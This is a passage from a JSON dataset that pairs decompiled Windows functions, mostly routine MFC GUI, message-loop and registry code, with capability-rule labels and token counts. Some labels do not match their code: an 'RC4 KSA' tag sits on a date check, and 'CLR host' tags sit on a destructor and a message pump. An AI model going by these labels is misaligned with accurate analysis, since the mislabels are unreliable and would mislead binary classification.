        "decompiled_code": "\ncode ** __thiscall fcn.0042573e(code **param_1, code *param_2, code *param_3, code *param_4, code *param_5)\n\n{\n    fcn.0041c2ea();\n    param_1[0xd] = vtable.CEnumArray::XEnumVOID.0;\n    param_1[7] = param_2;\n    param_1[8] = NULL;\n    param_1[10] = NULL;\n    param_1[0xb] = param_4;\n    param_1[9] = param_3;\n    param_1[0xc] = param_5;\n    *param_1 = vtable.CEnumArray.0;\n    return param_1;\n}\n",
        "token_count": 166
    },
    "00427725": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00427725(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    fcn.0042401d();\n    iVar1 = fcn.0041bd04(0x1c);\n    *(iVar1 + 4) = param_1;\n    *(iVar1 + 8) = param_2;\n    *(iVar1 + 0xc) = param_3;\n    fcn.0041b753(iVar1);\n    return;\n}\n",
        "token_count": 114
    },
    "0041b3e6": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b3e6(uint16_t *arg_8h, uint arg_ch)\n\n{\n    uint16_t **in_ECX;\n    \n    if (*arg_8h < 0x76c) {\n        *in_ECX = NULL;\n    }\n    else {\n        fcn.0041b39a(*arg_8h, arg_8h[1], arg_8h[3], arg_8h[4], arg_8h[5], arg_8h[6], arg_ch);\n        *in_ECX = arg_8h;\n    }\n    return;\n}\n",
        "token_count": 135
    },
    "00405302": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid fcn.00405302(void)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.COleControlSite.0;\n    pcVar1 = extraout_ECX[0x22];\n    *(unaff_EBP + -4) = 2;\n    if (pcVar1 != NULL) {\n        fcn.004071b8();\n        fcn.0041bd2d(pcVar1);\n    }\n    fcn.0040616f();\n    fcn.00405deb(extraout_ECX + 0xf, extraout_ECX[0x18]);\n    fcn.00405deb(0x42c3f8, extraout_ECX[0x19]);\n    fcn.00405deb(0x42c3a8, extraout_ECX[0x21]);\n    piVar2 = extraout_ECX[0x14];\n    if (piVar2 != NULL) {\n        (**(*piVar2 + 0x14))(piVar2);\n        (**(*extraout_ECX[0x14] + 8))(extraout_ECX[0x14]);\n        extraout_ECX[0x14] = NULL;\n    }\n    piVar2 = extraout_ECX[0x15];\n    if (piVar2 != NULL) {\n        (**(*piVar2 + 8))(piVar2);\n        extraout_ECX[0x15] = NULL;\n    }\n    piVar2 = extraout_ECX[0x13];\n    if (piVar2 != NULL) {\n        (**(*piVar2 + 0xc))(piVar2, 0);\n        (**(*extraout_ECX[0x13] + 0x18))(extraout_ECX[0x13], 1);\n        (**(*extraout_ECX[0x13] + 8))(extraout_ECX[0x13]);\n        extraout_ECX[0x13] = NULL;\n    }\n    (*_sym.imp.OLEAUT32.dll_VariantCopy)(extraout_ECX + 0x2a);\n    fcn.004069f2(0xffffffff, 0);\n    if (((extraout_ECX[0x25] != NULL) && (extraout_ECX[0x24] != NULL)) &&\n       (piVar2 = *(extraout_ECX[0x24] + 0x88),  piVar2 != NULL)) {\n        (**(*piVar2 + 8))(extraout_ECX, 0);\n    }\n    *(unaff_EBP + -4) = 1;\n    fcn.0041d2bd();\n    *(unaff_EBP + -4) = 0;\n    fcn.00426721();\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0041c304();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 763
    },
    "0041bdbe": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041bdbe(int32_t *param_1)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iStack4;\n    \n    bVar1 = true;\n    iStack4 = 0;\n    do {\n        if (bVar1) {\n            do {\n                iVar2 = (*_sym.imp.USER32.dll_PeekMessageA)(param_1 + 0xc, 0, 0, 0, 0);\n                if (iVar2 != 0) break;\n                iVar2 = iStack4 + 1;\n                iVar3 = (**(*param_1 + 0x60))(iStack4);\n                if (iVar3 == 0) {\n                    bVar1 = false;\n                }\n                iStack4 = iVar2;\n            } while (bVar1);\n        }\n        do {\n            iVar2 = (**(*param_1 + 0x5c))();\n            if (iVar2 == 0) {\n                (**(*param_1 + 0x68))();\n                return;\n            }\n            iVar2 = (**(*param_1 + 100))(param_1 + 0xc);\n            if (iVar2 != 0) {\n                bVar1 = true;\n            }\n            iVar2 = (*_sym.imp.USER32.dll_PeekMessageA)(param_1 + 0xc, 0, 0, 0, 0);\n        } while (iVar2 != 0);\n    } while( true );\n}\n",
        "token_count": 335
    },
    "00421b23": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nuint fcn.00421b23(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint uVar4;\n    \n    uVar4 = 0xffffffff;\n    piVar2 = fcn.0041bd38();\n    iVar3 = fcn.00423ff7();\n    piVar1 = *(iVar3 + 4);\n    iVar3 = fcn.00424e03(param_1, param_2, param_3, param_4);\n    if ((iVar3 != 0) && ((piVar1 == NULL || (iVar3 = (**(*piVar1 + 0x84))(),  iVar3 != 0)))) {\n        iVar3 = (**(*piVar2 + 0x50))();\n        if (iVar3 == 0) {\n            if (piVar2[7] != NULL) {\n                (**(*piVar2[7] + 0x58))();\n            }\n            uVar4 = (**(*piVar2 + 0x68))();\n        }\n        else {\n            uVar4 = (**(*piVar2 + 0x54))();\n        }\n    }\n    fcn.00427aa1();\n    return uVar4;\n}\n",
        "token_count": 292
    },
    "0042495f": {
        "rules": [
            "create or open registry key"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0042495f(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    var_4h = 0;\n    var_8h = 0;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(0x80000001, \"software\", 0, 0x2001f, &var_4h);\n    pcVar1 = _sym.imp.ADVAPI32.dll_RegCreateKeyExA;\n    if (iVar2 == 0) {\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)\n                          (var_4h, *(param_1 + 0x7c), 0, 0, 0, 0x2001f, 0, &var_8h, &var_10h);\n        if (iVar2 == 0) {\n            (*pcVar1)(var_8h, *(param_1 + 0x90), 0, 0, 0, 0x2001f, 0, &var_ch, &var_10h);\n        }\n    }\n    pcVar1 = _sym.imp.ADVAPI32.dll_RegCloseKey;\n    if (var_4h != 0) {\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_4h);\n    }\n    if (var_8h != 0) {\n        (*pcVar1)(var_8h);\n    }\n    return var_ch;\n}\n",
        "token_count": 382
    },
    "004249f3": {
        "rules": [
            "create or open registry key"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004249f3(uint lpSubKey)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    iVar1 = fcn.0042495f();\n    if (iVar1 == 0) {\n        var_4h = 0;\n    }\n    else {\n        (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)(iVar1, lpSubKey, 0, 0, 0, 0x2001f, 0, &var_4h, &var_8h);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(iVar1);\n    }\n    return var_4h;\n}\n",
        "token_count": 165
    },
    "00407398": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n\nuint __cdecl fcn.00407398(uint arg_8h)\n\n{\n    code **ppcVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint32_t uVar5;\n    uint *in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    *(unaff_EBP + -0x14) = 0;\n    if (extraout_ECX[1] != 0) {\n        *(unaff_EBP + -0x10) = 0;\n        ppcVar1 = **(unaff_EBP + 8);\n        *(unaff_EBP + -4) = 0;\n        iVar4 = (**ppcVar1)(*(unaff_EBP + 8), 0x42c398, unaff_EBP + -0x10);\n        *(unaff_EBP + -0x14) = iVar4;\n        if ((-1 < iVar4) && (uVar5 = 0,  extraout_ECX[1] != 0)) {\n            do {\n                (**(**(unaff_EBP + -0x10) + 0x18))(*(unaff_EBP + -0x10), *(*extraout_ECX + uVar5 * 8), 0);\n                uVar5 = uVar5 + 1;\n            } while (uVar5 < extraout_ECX[1]);\n        }\n        extraout_ECX[1] = 0;\n        fcn.0041bd2d(*extraout_ECX);\n        piVar2 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -4) = 0xffffffff;\n        *extraout_ECX = 0;\n        if (piVar2 != NULL) {\n            (**(*piVar2 + 8))(piVar2);\n        }\n    }\n    uVar3 = *(unaff_EBP + -0x14);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar3;\n}\n",
        "token_count": 539
    },
    "00409626": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00409626(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    iVar2 = 0;\n    uVar3 = 0;\n    uVar1 = *(*(param_1 + 8) + 4);\n    if (uVar1 != 0) {\n        do {\n            iVar2 = fcn.0040964e();\n            if (iVar2 < 0) {\n                return iVar2;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < uVar1);\n    }\n    return iVar2;\n}\n",
        "token_count": 152
    },
    "00409f87": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00409f87(uint param_1, int32_t param_2)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t unaff_EBX;\n    int32_t iVar4;\n    int32_t iVar5;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetWindowLongA;\n    iVar4 = 0;\n    if (param_2 != 0) {\n        while ((iVar5 = param_2,  uVar2 = (*pcVar1)(*(iVar5 + 0x1c), 0xfffffff0),  (uVar2 & 0xc0000000) == 0x40000000 &&\n               (iVar5 != unaff_EBX))) {\n            uVar3 = (*_sym.imp.USER32.dll_GetParent)(*(iVar5 + 0x1c));\n            param_2 = fcn.0041db42(uVar3);\n            uVar2 = (*pcVar1)(*(param_2 + 0x1c), 0xffffffec);\n            if ((uVar2 & 0x10000) != 0) {\n                return iVar5;\n            }\n            iVar4 = iVar5;\n            if (param_2 == 0) {\n                return iVar5;\n            }\n        }\n    }\n    return iVar4;\n}\n",
        "token_count": 298
    },
    "0040a0db": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040a0db(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint noname_5;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    int32_t noname_6;\n    \n    iVar3 = 0;\n    noname_6 = arg_ch;\n    iVar1 = fcn.00409f87(arg_8h);\n    while( true ) {\n        if (iVar1 != 0) {\n            iVar1 = *(iVar1 + 0x1c);\n        }\n        noname_5 = (*_sym.imp.USER32.dll_GetNextDlgGroupItem)(*(arg_8h + 0x1c), iVar1, 0);\n        iVar1 = fcn.0041db42();\n        if (((iVar1 == 0) || (iVar3 = iVar3 + 1,  iVar1 == arg_ch)) || (0x3c < iVar3)) break;\n        iVar2 = fcn.0040a0bc(iVar1, arg_10h);\n        if (iVar2 != 0) {\n            return iVar1;\n        }\n    }\n    iVar3 = fcn.00409f87(arg_8h);\n    iVar1 = iVar3;\n    do {\n        iVar1 = fcn.00409fe0(arg_8h, iVar1, 3, arg_8h, arg_ch, noname_5, noname_6, unaff_EDI, unaff_ESI);\n        iVar2 = fcn.0040a0bc(iVar1, arg_10h);\n        if (iVar2 != 0) {\n            return iVar1;\n        }\n    } while (iVar1 != iVar3);\n    return 0;\n}\n",
        "token_count": 409
    },
    "0040a186": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040a186(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t var_4h;\n    \n    iVar3 = 0;\n    var_4h = 0;\n    do {\n        arg_ch = fcn.0040a0db(arg_8h, arg_ch, arg_10h);\n        if (arg_ch == 0) {\n            return 0;\n        }\n        iVar1 = fcn.0040a160(arg_ch);\n        if (iVar1 != 0) {\n            uVar2 = (*_sym.imp.USER32.dll_GetNextDlgTabItem)(*(arg_8h + 0x1c), *(arg_ch + 0x1c), 0);\n            arg_ch = fcn.0041db42(uVar2);\n            if (arg_ch == 0) {\n                return 0;\n            }\n        }\n        iVar1 = fcn.00420478();\n        if (iVar1 != 0) {\n            return arg_ch;\n        }\n        if (arg_ch == iVar3) {\n            return 0;\n        }\n        if (iVar3 == 0) {\n            iVar3 = arg_ch;\n        }\n        var_4h = var_4h + 1;\n    } while (var_4h < 0x200);\n    return 0;\n}\n",
        "token_count": 324
    },
    "0040a1fb": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040a1fb(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    \n    if (param_1 != 0) {\n        piVar4 = NULL;\n        iVar3 = param_1;\n        do {\n            iVar1 = *(iVar3 + 0x34);\n            if ((iVar1 != 0) || (piVar4 = *(iVar3 + 0x38),  piVar4 != NULL)) break;\n            uVar2 = (*_sym.imp.USER32.dll_GetParent)(*(iVar3 + 0x1c));\n            iVar3 = fcn.0041db42(uVar2);\n        } while (iVar3 != 0);\n        if ((iVar3 != 0) && (iVar1 == 0)) {\n            (**(*piVar4 + 0xac))();\n            uVar2 = (*_sym.imp.USER32.dll_GetFocus)();\n            iVar3 = fcn.0041db42(uVar2);\n            if (iVar3 != param_1) {\n                fcn.004204ba();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 262
    },
    "0040a258": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040a258(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_retaddr;\n    \n    if ((param_1 != 0) &&\n       (iVar3 = (*_sym.imp.USER32.dll_IsWindow)(*(param_1 + 0x1c)),  pcVar2 = _sym.imp.USER32.dll_GetParent,  iVar3 != 0\n       )) {\n        uVar4 = *(param_1 + 0x1c);\n        while( true ) {\n            uVar4 = (*pcVar2)(uVar4);\n            iVar3 = fcn.0041db42(uVar4);\n            if (iVar3 == 0) break;\n            piVar1 = *(iVar3 + 0x34);\n            if (piVar1 != NULL) {\n                if (piVar1[0x12] == 0) {\n                    return;\n                }\n                iVar3 = fcn.0041db42(*(piVar1[0x12] + 0x20));\n                if (iVar3 == 0) {\n                    return;\n                }\n                if (unaff_retaddr == iVar3) {\n                    return;\n                }\n                if ((unaff_retaddr != 0) &&\n                   (iVar3 = (*_sym.imp.USER32.dll_IsChild)(*(iVar3 + 0x1c), *(unaff_retaddr + 0x1c)),  iVar3 != 0)) {\n                    return;\n                }\n                (**(*piVar1 + 0x5c))(0);\n                return;\n            }\n            uVar4 = *(iVar3 + 0x1c);\n        }\n    }\n    return;\n}\n",
        "token_count": 387
    },
    "0040a2cb": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0040a2cb(int32_t param_1, uint param_2)\n\n{\n    int32_t noname_4;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t noname_1;\n    uint unaff_EBX;\n    int32_t unaff_ESI;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    uint noname_5;\n    \n    noname_4 = fcn.00420262();\n    if (noname_4 == 0) {\n        noname_5 = 1;\n        iVar1 = fcn.00409fe0(param_1, 0, 1, param_2, unaff_EDI, unaff_ESI, unaff_EBX, unaff_retaddr, param_1);\n        noname_1 = iVar1;\n        if (iVar1 != param_1) {\n            do {\n                iVar2 = fcn.004203a6();\n                if (iVar2 == unaff_ESI) {\n                    return noname_1;\n                }\n                noname_1 = fcn.00409fe0(param_1, noname_1, 1, param_1, noname_4, noname_5, param_2, unaff_EDI, unaff_ESI\n                                       );\n            } while ((noname_1 != 0) && (noname_1 != iVar1));\n        }\n        noname_4 = 0;\n    }\n    return noname_4;\n}\n",
        "token_count": 332
    },
    "0040a390": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040a390(uint param_1, int32_t param_2, uint param_3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t noname_1;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    uint noname_4;\n    int32_t noname_5;\n    \n    if (param_2 != 0) {\n        noname_4 = *(param_2 + 0x1c);\n        uVar1 = (*_sym.imp.USER32.dll_GetWindowLongA)(noname_4, 0xffffffec);\n        if ((uVar1 & 0x10000) == 0) {\n            iVar2 = fcn.00409f87();\n            noname_5 = param_2;\n            goto code_r0x0040a3c5;\n        }\n    }\n    noname_5 = 3;\n    noname_4 = 0;\n    iVar2 = fcn.00409fe0(param_1, 0, 3, unaff_EDI, unaff_ESI, unaff_retaddr, param_1, param_2, param_3);\ncode_r0x0040a3c5:\n    noname_1 = iVar2;\n    if (iVar2 != 0) {\n        do {\n            fcn.0040a322(noname_1, 0);\n            noname_1 = fcn.00409fe0(unaff_EDI, noname_1, 0, unaff_EDI, noname_4, noname_5, unaff_EDI, unaff_ESI, \n                                    unaff_retaddr);\n            if (noname_1 == 0) {\n                return;\n            }\n        } while (noname_1 != iVar2);\n    }\n    return;\n}\n",
        "token_count": 409
    },
    "0040ad73": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040ad73(void)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.00423ff7();\n    fcn.00424b3c(0xb);\n    while (puVar1 = *(iVar2 + 0x103c),  puVar1 != NULL) {\n        fcn.00424390();\n        if (puVar1 != NULL) {\n            (***puVar1)(1);\n        }\n    }\n    fcn.00424bac(0xb);\n    return;\n}\n",
        "token_count": 123
    },
    "0041b7d7": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.0041b7d7(int32_t param_1, int32_t param_2, uint *param_3)\n\n{\n    if (param_3 != NULL) goto code_r0x0041b7e4;\n    param_3 = *(param_1 + 4);\n    while( true ) {\n        if (param_3 == NULL) {\n            return NULL;\n        }\n        if (param_3[2] == param_2) break;\ncode_r0x0041b7e4:\n        param_3 = *param_3;\n    }\n    return param_3;\n}\n",
        "token_count": 138
    },
    "0041b81a": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041b81a(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    \n    if (param_1 != NULL) {\n        do {\n            piVar1 = *param_1;\n            fcn.0041bd2d(param_1);\n            param_1 = piVar1;\n        } while (piVar1 != NULL);\n    }\n    return;\n}\n",
        "token_count": 92
    },
    "0041b972": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.0041b972(int32_t param_1, uint32_t param_2, uint32_t *param_3)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    \n    uVar2 = (param_2 >> 4) % *(param_1 + 8);\n    *param_3 = uVar2;\n    if (*(param_1 + 4) != 0) {\n        for (puVar1 = *(*(param_1 + 4) + uVar2 * 4); puVar1 != NULL; puVar1 = *puVar1) {\n            if (puVar1[1] == param_2) {\n                return puVar1;\n            }\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 171
    },
    "0041b9a4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0041b9a4(int32_t param_1, uint32_t param_2)\n\n{\n    uint *puVar1;\n    \n    if (*(param_1 + 4) != 0) {\n        for (puVar1 = *(*(param_1 + 4) + ((param_2 >> 4) % *(param_1 + 8)) * 4); puVar1 != NULL; puVar1 = *puVar1) {\n            if (puVar1[1] == param_2) {\n                return puVar1[2];\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 141
    },
    "0041ba49": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0041ba49(int32_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    \n    iVar1 = *(param_1 + 4);\n    if (iVar1 != 0) {\n        uVar4 = (param_2 >> 4) % *(param_1 + 8);\n        puVar2 = *(iVar1 + uVar4 * 4);\n        puVar5 = iVar1 + uVar4 * 4;\n        while (puVar3 = puVar2,  puVar3 != NULL) {\n            if (puVar3[1] == param_2) {\n                *puVar5 = *puVar3;\n                fcn.0041b959(puVar3);\n                return 1;\n            }\n            puVar5 = puVar3;\n            puVar2 = *puVar3;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 233
    },
    "0041bd04": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0041bd04(uint param_1)\n\n{\n    int32_t iVar1;\n    \n    while( true ) {\n        iVar1 = fcn.0040ae6e(param_1);\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n        if (*0x4494d0 == NULL) break;\n        iVar1 = (**0x4494d0)(param_1);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 119
    },
    "0041e65b": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0041e65b(int32_t param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar1 = (*_sym.imp.USER32.dll_GetMenuItemCount)(*(param_1 + 4));\n    iVar4 = 0;\n    if (0 < iVar1) {\n        do {\n            uVar2 = (*_sym.imp.USER32.dll_GetSubMenu)(*(param_1 + 4), iVar4);\n            iVar3 = fcn.004206cb(uVar2);\n            if (iVar3 == 0) {\n                iVar3 = (*_sym.imp.USER32.dll_GetMenuItemID)(*(param_1 + 4), iVar4);\n                if (iVar3 == param_1) {\n                    iVar1 = fcn.004206e0(*(param_1 + 4));\n                    return iVar1;\n                }\n            }\n            else {\n                iVar3 = fcn.0041e65b(iVar3, param_3);\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < iVar1);\n    }\n    return 0;\n}\n",
        "token_count": 285
    },
    "0041f0df": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0041f0df(int32_t param_1)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetParent;\n    if ((param_1 != 0) && (iVar4 = *(param_1 + 0x1c),  iVar4 != 0)) {\n        while( true ) {\n            uVar2 = (*pcVar1)(iVar4);\n            piVar3 = fcn.0041db42(uVar2);\n            if (piVar3 == NULL) break;\n            iVar4 = (**(*piVar3 + 0xb0))();\n            if (iVar4 != 0) {\n                return piVar3;\n            }\n            iVar4 = piVar3[7];\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 200
    },
    "0041f162": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0041f162(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if ((param_1 != 0) && (iVar1 = *(param_1 + 0x1c),  *(param_1 + 0x1c) != 0)) {\n        do {\n            iVar3 = iVar1;\n            iVar1 = fcn.0041f11d(iVar3);\n        } while (iVar1 != 0);\n        uVar2 = fcn.0041db42(iVar3);\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 149
    },
    "0041f1cb": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041f1cb(uint hDlg, uint nIDDlgItem, int32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.USER32.dll_GetDlgItem)(hDlg, nIDDlgItem);\n    pcVar1 = _sym.imp.USER32.dll_GetTopWindow;\n    if (iVar2 != 0) {\n        iVar3 = (*_sym.imp.USER32.dll_GetTopWindow)(iVar2);\n        if ((iVar3 != 0) && (iVar3 = fcn.0041f1cb(iVar2, nIDDlgItem, arg_10h),  iVar3 != 0)) {\n            return iVar3;\n        }\n        if (arg_10h == 0) {\n            iVar2 = fcn.0041db42();\n            return iVar2;\n        }\n        iVar2 = fcn.0041db69(iVar2);\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n    }\n    iVar2 = (*pcVar1)(hDlg);\n    while( true ) {\n        if (iVar2 == 0) {\n            return 0;\n        }\n        iVar3 = fcn.0041f1cb(iVar2, nIDDlgItem, arg_10h);\n        if (iVar3 != 0) break;\n        iVar2 = (*_sym.imp.USER32.dll_GetWindow)(iVar2, 2);\n    }\n    return iVar3;\n}\n",
        "token_count": 336
    },
    "0041f7a9": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041f7a9(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint var_1ch;\n    \n    pcVar1 = _sym.imp.USER32.dll_PeekMessageA;\n    while( true ) {\n        iVar2 = (*pcVar1)(&var_1ch, 0, 0x121, 0x121, 1);\n        if (iVar2 == 0) break;\n        (*_sym.imp.USER32.dll_DispatchMessageA)(&var_1ch);\n    }\n    fcn.0041daa9();\n    return;\n}\n",
        "token_count": 136
    },
    "004207b9": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __thiscall fcn.004207b9(int32_t param_1, int32_t param_2)\n\n{\n    while( true ) {\n        if (param_1 == 0) {\n            return 0;\n        }\n        if (param_1 == param_2) break;\n        param_1 = *(param_1 + 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 87
    },
    "004224d4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004224d4(int32_t hWnd, uint lpPoint, uint arg_10h)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint lpRect;\n    \n    (*_sym.imp.USER32.dll_ClientToScreen)(hWnd, &lpPoint);\n    pcVar1 = _sym.imp.USER32.dll_GetWindow;\n    uVar5 = 5;\n    do {\n        hWnd = (*pcVar1)(hWnd, uVar5);\n        if (hWnd == 0) {\n            return 0;\n        }\n        iVar2 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(hWnd);\n        if ((iVar2 != -1) &&\n           (uVar3 = (*_sym.imp.USER32.dll_GetWindowLongA)(hWnd, 0xfffffff0),  (uVar3 & 0x10000000) != 0)) {\n            (*_sym.imp.USER32.dll_GetWindowRect)(hWnd, &lpRect);\n            iVar4 = (*_sym.imp.USER32.dll_PtInRect)(&lpRect, lpPoint, arg_10h);\n            if (iVar4 != 0) {\n                return hWnd;\n            }\n        }\n        uVar5 = 2;\n    } while( true );\n}\n",
        "token_count": 300
    },
    "00422cc2": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00422cc2(int32_t param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    \n    pcVar2 = _sym.imp.USER32.dll_GetParent;\n    iVar3 = param_1;\n    if (param_1 != 0) goto code_r0x00422d3b;\n    iVar3 = fcn.00422d5e();\n    if ((iVar3 == 0) && (iVar3 = fcn.00403370(),  iVar3 == 0)) {\n        iVar3 = 0;\n        iVar4 = iVar3;\n        iVar5 = iVar3;\n    }\n    else {\n        for (iVar3 = *(iVar3 + 0x1c); iVar4 = iVar3,  iVar5 = iVar3,  iVar3 != 0; iVar3 = (*pcVar2)(iVar3)) {\ncode_r0x00422d3b:\n            uVar6 = (*_sym.imp.USER32.dll_GetWindowLongA)(iVar3, 0xfffffff0);\n            iVar4 = iVar3;\n            iVar5 = iVar3;\n            if ((uVar6 & 0x40000000) == 0) break;\n        }\n    }\n    while (iVar1 = iVar4,  iVar1 != 0) {\n        iVar4 = (*pcVar2)(iVar1);\n        iVar3 = iVar1;\n    }\n    if ((param_1 == 0) && (iVar5 != 0)) {\n        iVar5 = (*_sym.imp.USER32.dll_GetLastActivePopup)(iVar5);\n    }\n    if (param_2 != NULL) {\n        if (((iVar3 == 0) || (iVar4 = (*_sym.imp.USER32.dll_IsWindowEnabled)(iVar3),  iVar4 == 0)) || 